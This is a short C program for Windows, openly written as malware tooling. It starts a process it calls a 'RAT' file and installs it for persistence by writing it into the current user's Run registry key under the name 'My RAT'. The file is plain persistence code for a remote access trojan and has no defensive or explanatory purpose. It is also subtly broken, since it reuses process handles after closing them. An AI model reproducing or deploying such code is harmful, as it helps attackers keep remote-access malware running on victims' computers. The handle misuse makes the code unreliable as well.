#include <stdio.h>
#include <windows.h>

// Function to create RAT file
void CreateRatFile(HANDLE hProcess, char* szCmdLine)
{
    STARTUPINFOA si = { sizeof(si) };
    PROCESS_INFORMATION pi = { 0 };

    ZeroMemory(&pi, sizeof(pi));

    // Create a new process for the RAT file and set its parameters.
    if (CreateProcessA(NULL, szCmdLine, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)) {
        // Wait for the process to become active.
        WaitForInputIdle(pi.hProcess, INFINITE);
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
    } else {
        printf("Error starting Rat File\n");
        return;
    }

    // Wait for the RAT process to become active.
    DWORD dwExitCode;
    if (WaitForInputIdle(pi.hProcess, 5000) == WAIT_FAILED)
    {
        printf("Error waiting for RAT process to become active: %lu\n", GetLastError());
        TerminateProcess(pi.hProcess, 0);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        return;
    }

    printf("RAT process created successfully (PID: %lu)\n", pi.dwProcessId);

    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
}

// Function to add RAT file to system startup
void AddToStartup(char* szCmdLine)
{
    HKEY hKey;
    LONG lResult;

    // Open the "Run" key for the current user.
    lResult = RegOpenKeyExA(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_ALL_ACCESS, &hKey);
    if (lResult != ERROR_SUCCESS)
    {
        printf("Error opening Run key: %lu\n", lResult);
        return;
    }

    // Add the RAT file to the "Run" key.
    lResult = RegSetValueExA(hKey, "My RAT", 0, REG_SZ, (BYTE*)szCmdLine, strlen(szCmdLine) + 1);
    if (lResult != ERROR_SUCCESS)
    {
        printf("Error adding RAT file to Run key: %lu\n", lResult);
        return;
    }

    printf("RAT file added to Run key successfully\n");

    RegCloseKey(hKey);
}

int main()
{
    // Example usage of the CreateRatFile and AddToStartup functions
    HANDLE hProcess = GetCurrentProcess();
    char* szCmdLine = "path/to/RAT/file.exe";
    CreateRatFile(hProcess, szCmdLine);
    AddToStartup(szCmdLine);

    return 0;
}
